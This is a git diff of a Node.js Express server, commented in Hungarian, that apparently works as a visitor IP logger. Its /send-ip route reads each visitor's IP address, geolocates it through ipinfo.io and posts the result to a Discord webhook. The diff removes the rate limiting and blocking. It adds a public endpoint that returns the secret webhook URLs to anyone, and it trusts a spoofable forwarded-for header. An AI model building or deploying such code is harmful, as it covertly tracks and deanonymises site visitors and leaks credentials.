@@ -5,14 +5,7 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Maximális próbálkozások és blokkolás idő
-const MAX_ATTEMPTS = 5;
-const BLOCK_TIME = 60000; // 1 perc (60,000 ms) után automatikusan feloldódik
-
-// In-memory tárolás próbálkozások számának
-const attempts = {};
-const blockedIps = {};
-
+// Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Webhook URL és IPINFO token a .env fájlból
@@ -20,32 +13,19 @@ const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
-// /send-ip útvonal a webhook küldéséhez
+// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
+});
+
+// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
+app.get('/get-webhook-url', (req, res) => {
+    res.json({ webhookUrl, altWebhookUrl });
+});
+
+// /send-ip útvonal
 app.get('/send-ip', async (req, res) => {
-    const userIp = req.ip || req.headers['x-forwarded-for'];
-
-    // Ellenőrizzük, hogy az IP blokkolva van-e
-    if (blockedIps[userIp] && blockedIps[userIp].blocked) {
-        return res.status(403).send('Hozzáférés megtagadva, az IP blokkolva van!');
-    }
-
-    // Növeljük a próbálkozások számát
-    if (!attempts[userIp]) {
-        attempts[userIp] = 0;
-    }
-
-    attempts[userIp]++;
-
-    // Ha a próbálkozások száma túllépi a limitet, blokkoljuk az IP-t
-    if (attempts[userIp] >= MAX_ATTEMPTS) {
-        blockedIps[userIp] = { blocked: true };
-        setTimeout(() => {
-            blockedIps[userIp] = { blocked: false };
-            console.log(`IP ${userIp} most már újra elérheti az oldalt.`);
-        }, BLOCK_TIME);
-
-        return res.status(403).send('Hozzáférés megtagadva, túl sok próbálkozás miatt.');
-    }
+    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
@@ -64,18 +44,12 @@ app.get('/send-ip', async (req, res) => {
             }]
         };
 
-        await axios.post(webhookUrl, message); // Webhook küldés
-
-        res.send('IP és helyadatok sikeresen elküldve Discordra!');
+        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
+        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
         res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
     }
-});
-
-// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(port, () => {
